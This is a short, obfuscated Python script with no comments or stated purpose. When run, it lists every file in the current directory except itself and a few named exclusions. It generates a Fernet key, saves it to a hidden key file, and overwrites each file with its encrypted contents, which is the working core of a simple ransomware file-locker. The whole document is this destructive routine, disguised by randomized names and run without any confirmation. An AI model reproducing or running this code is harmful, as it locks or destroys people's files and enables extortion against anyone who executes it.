import os
from cryptography.fernet import Fernet

PsgMlTwHkVQVIJyHohkYBQ = []
kwDpv2EXjDObPBH4Dkeq9w = Fernet.generate_key()

def __1GKL6DzyAVA1DTFwlM0YRQ__():
    for QYDqAfWt in os.listdir():
        if QYDqAfWt == os.path.basename(__file__) or QYDqAfWt == '3KaGsRSyX0TCgnigQRQyNg.py' or QYDqAfWt == '.gPLoBjehKA_LgHoOrGYa5g.key':
            continue
        elif os.path.isfile(QYDqAfWt):
            PsgMlTwHkVQVIJyHohkYBQ.append(QYDqAfWt)

def __3XHyyb4khvUpqEwGgF87kw__():
    with open('.gPLoBjehKA_LgHoOrGYa5g.key', 'wb') as LI19DgPUOQBhtWwLVAfzqA:
        LI19DgPUOQBhtWwLVAfzqA.write(kwDpv2EXjDObPBH4Dkeq9w)
    for QYDqAfWt in PsgMlTwHkVQVIJyHohkYBQ:
        with open(QYDqAfWt, 'rb') as L3vqnXuOStHR_KANrTsf6Q:
            MQQjwTv76zBTWQQ26RwPeQ = L3vqnXuOStHR_KANrTsf6Q.read()
        LP0637y577Mydt5AAj_8sQ = Fernet(kwDpv2EXjDObPBH4Dkeq9w).encrypt(MQQjwTv76zBTWQQ26RwPeQ)
        with open(QYDqAfWt, 'wb') as L3vqnXuOStHR_KANrTsf6Q:
            L3vqnXuOStHR_KANrTsf6Q.write(LP0637y577Mydt5AAj_8sQ)

__1GKL6DzyAVA1DTFwlM0YRQ__()
__3XHyyb4khvUpqEwGgF87kw__()


